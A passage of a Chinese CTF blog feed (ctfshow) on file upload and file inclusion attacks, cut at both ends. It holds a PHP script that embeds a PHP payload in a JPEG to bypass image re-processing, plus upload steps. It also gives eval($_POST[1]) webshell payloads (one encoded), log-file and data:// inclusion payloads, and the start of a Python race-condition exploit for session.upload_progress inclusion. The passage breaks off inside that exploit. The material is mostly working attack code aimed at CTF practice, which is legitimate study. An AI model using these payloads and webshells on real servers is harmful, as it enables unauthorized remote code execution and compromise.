variable">$pad</span><span class="token punctuation">;</span>        <span class="token variable">$dis</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataInputStream</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$outStream</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$extraBytes</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0xFFD8</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Incorrect SOI marker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0xFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$marker</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>            <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">skip</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$marker</span> <span class="token operator">===</span> <span class="token number">0xDA</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$startPos</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$outStreamTmp</span> <span class="token operator">=</span>                     <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span> <span class="token operator">.</span>                     <span class="token variable">$miniPayload</span> <span class="token operator">.</span>                     <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\0"</span><span class="token punctuation">,</span><span class="token variable">$nullbytePayloadSize</span><span class="token punctuation">)</span> <span class="token operator">.</span>                     <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$outStreamTmp</span><span class="token punctuation">,</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$extraBytes</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0xFF</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$dis</span><span class="token operator">-></span><span class="token property">readByte</span> <span class="token operator">!==</span> <span class="token number">0x00</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                                <span class="token keyword">break</span><span class="token punctuation">;</span>                            <span class="token punctuation">&#125;</span>                        <span class="token punctuation">&#125;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token variable">$stopPos</span> <span class="token operator">=</span> <span class="token variable">$dis</span><span class="token operator">-></span><span class="token function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">;</span>                    <span class="token variable">$imageStreamSize</span> <span class="token operator">=</span> <span class="token variable">$stopPos</span> <span class="token operator">-</span> <span class="token variable">$startPos</span><span class="token punctuation">;</span>                    <span class="token variable">$outStream</span> <span class="token operator">=</span>                         <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">)</span> <span class="token operator">.</span>                         <span class="token variable">$miniPayload</span> <span class="token operator">.</span>                         <span class="token function">substr</span><span class="token punctuation">(</span>                            <span class="token function">str_repeat</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"\0"</span><span class="token punctuation">,</span><span class="token variable">$nullbytePayloadSize</span><span class="token punctuation">)</span><span class="token operator">.</span>                                <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$startPos</span><span class="token punctuation">,</span> <span class="token variable">$imageStreamSize</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                            <span class="token number">0</span><span class="token punctuation">,</span>                            <span class="token variable">$nullbytePayloadSize</span><span class="token operator">+</span><span class="token variable">$imageStreamSize</span><span class="token operator">-</span><span class="token variable">$extraBytes</span><span class="token punctuation">)</span> <span class="token operator">.</span>                                 <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$outStream</span><span class="token punctuation">,</span> <span class="token variable">$stopPos</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$correctImage</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token variable">$outStream</span> <span class="token operator">=</span> <span class="token variable">$outStreamTmp</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkImage</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'payload_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$outStream</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Success!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'payload_'</span><span class="token operator">.</span><span class="token variable">$argv</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Something\'s wrong'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function-definition function">checkImage</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">,</span> <span class="token variable">$unlink</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">TRUE</span><span class="token punctuation">;</span>        <span class="token function">imagecreatefromjpeg</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$unlink</span><span class="token punctuation">)</span>            <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">custom_error_handler</span><span class="token punctuation">(</span><span class="token variable">$errno</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$errfile</span><span class="token punctuation">,</span> <span class="token variable">$errline</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">global</span> <span class="token variable">$extraBytes</span><span class="token punctuation">,</span> <span class="token variable">$correctImage</span><span class="token punctuation">;</span>        <span class="token variable">$correctImage</span> <span class="token operator">=</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/(\d+) extraneous bytes before marker/'</span><span class="token punctuation">,</span> <span class="token variable">$errstr</span><span class="token punctuation">,</span> <span class="token variable">$m</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$extraBytes</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword type-casting">int</span><span class="token punctuation">)</span><span class="token variable">$m</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">DataInputStream</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$binData</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$order</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$size</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token variable">$order</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$fromString</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">order</span> <span class="token operator">=</span> <span class="token variable">$order</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$fromString</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'File not exists ['</span><span class="token operator">.</span><span class="token variable">$filename</span><span class="token operator">.</span><span class="token string single-quoted-string">']'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">size</span> <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">seek</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">size</span> <span class="token operator">-</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">skip</span><span class="token punctuation">(</span><span class="token variable">$skip</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token variable">$skip</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readByte</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$byte</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$byte</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">readShort</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'End Of File'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">order</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>                <span class="token variable">$short</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$short</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token keyword">return</span> <span class="token variable">$short</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">eof</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">return</span> <span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token class-name">binData</span><span class="token operator">||</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">binData</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h6 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h6><p>1、随便找一个jpg图片，先上传至服务器然后再下载到本地保存为 1.jpg(成功率低)</p><p>2、插入php代码；使用脚本处理1.jpg，命令：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">php jpg_payload.php <span class="token number">1</span>.jpg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3、上传图片马；将生成的 payload_1.jpg上传。</p><p>注意：有一些jpg图片不能被处理，所以要多尝试一些jpg图片</p><p><img src="/images/image-20220814181357332-1662567533534.png" alt="image-20220814181357332"></p><h2 id="压缩包"><a href="#压缩包" class="headerlink" title="压缩包"></a>压缩包</h2><p>在压缩包最后面增加<code>&lt;?php eval($_POST[1]);?&gt;</code>然后上传</p>]]></content>
      
      
      
        <tags>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含</title>
      <link href="/2022/09/08/wen-jian-bao-han/"/>
      <url>/2022/09/08/wen-jian-bao-han/</url>
      
        <content type="html"><![CDATA[<h2 id="1、PHP伪协议"><a href="#1、PHP伪协议" class="headerlink" title="1、PHP伪协议"></a>1、PHP伪协议</h2><p> <a href="https://segmentfault.com/a/1190000018991087">https://segmentfault.com/a/1190000018991087</a> </p><p>include和require被过滤了<code>. ;(</code>等等都可使用非字母数字页数字符构造</p><p>payload :<code>data://text/plain,&lt;?php eval($_POST[1]);?&gt;</code></p><p>&#x3D;&gt;~%9b%9e%8b%9e%c5%d0%d0%8b%9a%87%8b%d0%8f%93%9e%96%91%d3%c3%c0%8f%97%8f%df%9a%89%9e%93%d7%db%a0%af%b0%ac%ab%a4%ce%a2%d6%c4%c0%c1</p><p>但是POST的话要使用先进行urldecode</p><h2 id="2、日志文件包含（不能使用伪协议就想日志文件包含、session包含）"><a href="#2、日志文件包含（不能使用伪协议就想日志文件包含、session包含）" class="headerlink" title="2、日志文件包含（不能使用伪协议就想日志文件包含、session包含）"></a>2、日志文件包含（不能使用伪协议就想日志文件包含、session包含）</h2><p> 日志文件路径： ?file&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">一、日志默认路径(1) apache+Linux日志默认路径    /etc/httpd/logs/access_log或者            /var/log/httpd/access_log(5) nginx 日志文件    日志文件在用户安装目录logs目录下        以我的安装路径为例/usr/local/nginx,        那我的日志目录就是在/usr/local/nginx/logs里+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++二、web中间件默认配置(1) apache+linux 默认配置文件    /etc/httpd/conf/httpd.conf或者     index.php?page=/etc/init.d/httpd<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一般日志包含都是在User_Agent中写需要包含的代码，包含执行，如果使用GET或者POST请求，会对特殊字符进行URL编码</p><p><img src="/images/image-20220809100244083-1663048886857.png" alt="image-20220809100244083"></p><h2 id="3、php中的session-upload-progress进行Session文件包含"><a href="#3、php中的session-upload-progress进行Session文件包含" class="headerlink" title="3、php中的session.upload_progress进行Session文件包含"></a>3、php中的session.upload_progress进行Session文件包含</h2><p>在php.ini有以下几个默认选项</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">1. session.upload_progress.enabled = on2. session.upload_progress.cleanup = on3. session.upload_progress.prefix = "upload_progress_"4. session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>代码里没有<code>session_start()</code>,如何创建session文件呢？</strong></p><p><strong>解答一</strong></p><p>其实，如果<code>session.auto_start=On</code> ，则PHP在接收请求的时候会自动初始化Session，不再需要执行session_start()。但默认情况下，这个<strong>选项都是关闭的</strong>。</p><p>但session还有一个默认选项，session.use_strict_mode默认值为0。此时<strong>用户是可以自己定义Session ID</strong>的。比如，我们在<strong>Cookie里设置PHPSESSID&#x3D;TGAO，PHP将会在服务器上创建一个文件：&#x2F;tmp&#x2F;sess_TGAO”</strong>。即使此时用户没有初始化Session，PHP也会自动初始化Session。 并产生一个键值，这个键值有ini.get(“session.upload_progress.prefix”)+由我们构造的session.upload_progress.name值组成，最后被写入sess_文件里。</p><p><strong>问题二</strong></p><p><strong>默认配置<code>session.upload_progress.cleanup = on</code>导致文件上传后，session文件内容立即清空</strong>，</p><p><strong>如何进行rce呢？</strong></p><p><strong>解答二</strong></p><p>此时我们可以利用竞争，在session文件内容清空前进行包含利用。</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">":"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"."</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"???"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp.py</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> io<span class="token keyword">import</span> requests<span class="token keyword">import</span> threadingsessid <span class="token operator">=</span> <span class="token string">'k1he'</span>url <span class="token operator">=</span> <span class="token string">'http://6d9a43f2-887b-40fd-b87e-77f9f75b733d.challenge.ctf.show/'</span><span class="token keyword">def</span> <span class="token function">write</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span> event<span class="token punctuation">.</span>isSet<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        f <span class="token operator">=</span> io<span class="token punctuation">.</span>BytesIO<span class="token punctuation">(</span><span class="token string">b'a'</span><span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">50</span><span class="token punctuation">)</span>                     <span class="token comment">#创建文件</span>        response <span class="token operator">=</span> session<span class="token 